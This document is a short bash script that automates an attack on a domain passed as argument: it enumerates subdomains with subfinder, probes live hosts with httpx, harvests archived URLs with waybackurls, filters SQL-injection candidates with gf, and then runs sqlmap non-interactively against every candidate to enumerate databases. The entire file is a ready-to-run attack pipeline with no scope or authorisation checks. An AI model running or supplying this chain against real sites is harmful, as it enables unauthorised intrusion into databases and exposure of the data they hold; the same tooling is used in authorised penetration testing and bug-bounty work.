#! /bin/bash
#subfinder
subfinder -d $1 | tee -a ~/domains.txt
#httpx
cat ~/domains.txt | httpx -o  ~/alive.txt
#waybackurls
cat ~/alive.txt | waybackurls | egrep -v '(.js|.png|.svg|.gif|.jpg|.txt)' | tee -a ~/urls.txt
#gf
gf sqli ~/urls.txt >> ~/sqli.txt
#sqlmap
sqlmap -m ~/sqli.txt --dbs --batch